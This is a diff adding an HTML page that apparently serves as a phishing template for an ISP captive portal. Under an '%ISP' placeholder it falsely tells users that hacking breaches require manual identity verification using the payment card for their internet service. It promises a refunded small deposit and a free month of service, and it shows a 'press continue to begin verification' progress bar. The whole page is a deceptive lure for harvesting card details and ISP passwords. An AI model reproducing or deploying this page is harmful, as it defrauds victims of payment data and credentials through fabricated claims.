@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+<head>
+
+  <title>Verify Identity</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+  
+  <link rel="stylesheet" href="http://wbpreview.com/previews/WB009T88H/css/supersized.css" type="text/css" media="screen" />
+  <link rel="stylesheet" href="http://wbpreview.com/previews/WB009T88H/css/bootstrap.min.css" type="text/css" media="screen" />
+  <link rel="stylesheet" href="http://wbpreview.com/previews/WB009T88H/css/bootstrap-responsive.min.css" type="text/css" media="screen" />
+  <link rel="stylesheet" href="http://wbpreview.com/previews/WB009T88H/theme/supersized.shutter.css" type="text/css" media="screen" />
+  
+  <!-- Custom Styling -->
+  <link rel="stylesheet" href="http://wbpreview.com/previews/WB009T88H/css/custom.css" type="text/css" media="screen" />
+  
+  <script type="text/javascript" src="http://wbpreview.com/previews/WB009T88H/js/jquery.js"></script>
+  <script type="text/javascript" src="http://wbpreview.com/previews/WB009T88H/js/jquery.easing.min.js"></script>
+  <script type="text/javascript" src="http://wbpreview.com/previews/WB009T88H/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="http://wbpreview.com/previews/WB009T88H/js/countdown.js"></script>
+  <script type="text/javascript" src="http://wbpreview.com/previews/WB009T88H/js/custom.js"></script>
+
+  <script type="text/javascript" src="http://wbpreview.com/previews/WB009T88H/js/supersized.3.2.7.min.js"></script>
+  <script type="text/javascript" src="http://wbpreview.com/previews/WB009T88H/theme/supersized.shutter.min.js"></script>
+  
+  <script type="text/javascript">
+    
+    jQuery(function($){
+      $.supersized({
+        // Functionality
+        slide_interval          :   3000,   // Length between transitions
+        transition              :   1,      // 0-None, 1-Fade, 2-Slide Top, 3-Slide Right, 4-Slide Bottom, 5-Slide Left, 6-Carousel Right, 7-Carousel Left
+        transition_speed    : 700,    // Speed of transition    
+        thumb_links       : false,
+        image_protect     : false,
+        // Components             
+        slide_links       : 'blank',  // Individual links for each slide (Options: false, 'num', 'name', 'blank')
+        slides          :   [     // Slideshow Images
+                          {image : 'http://slowbuddy.com/wp-content/gallery/clouds-photography_1/cutclouds.jpg', title : ''}
+                      ]
+      });
+    });
+    
+  </script>
+  
+</head>
+
+<body>
+  
+  <div class="container main-container">
+  
+    <div class="span8 offset2">
+  
+      <div class="countdown-container">
+      
+        <h2 class="pull-left">%ISP</h2>
+      
+        <div id="defaultCountdown"><ul><li>Manual verification is required for continued internet access</li></ul></div><!-- #defaultCountdown -->
+      
+      </div><!-- .countdown-container -->
+      
+        <ul class="nav nav-tabs">
+          <li class="active"><a href="#tab-1" data-toggle="tab" disabled>Information</a></li>
+        </ul><!-- .nav nav-tabs -->
+      <div class="tabbable tabs-below">
+      
+        <div class="tab-content">
+        
+          <div id="tab-1" class="tab-pane active">
+          
+            <!-- <div class="hero-unit">
+          
+            <h1>Verify identity</h1>
+            
+            </div> -->
+            
+            <p>
+            
+              You are required to manually verify your identity before you continue using your Internet service due to a recent hacking breaches against ISP networks.
+              Be aware that your data is secure and the suspect is currently being dealt with. Once verified, you will be prompted to change your ISP password and then access will be restored to your account.
+              Verification is done via the card that you use to pay for the ISP, a small amount will be deposited to confirm the card exists. This amount will be restored later.
+              <br/><br/>
+              We have also agreed to give our customers one month of free internet service at their current package as a gesture of good will, as we understand manual verification is a long, time-consuming process.
+            
+            </p>
+          
+          </div><!-- #tab-1 -->
+          
+          
+        </div><!-- .tab-content -->
+        
+        <hr>
+
+        <h3>Verification Progress</h3>
+        <p>0% - Press continue to begin verification<br/></p>
+        <div class="progress progress-success">
+        <div class="bar" style="width: 0%;"></div>
+        </div><!--  -->
+        
+      </div><!-- .tabbable tabs-below -->
+    
+    </div><!-- .span8 offset2 -->
+  
+  </div><!-- .container main-container -->
+</body>
+</html>
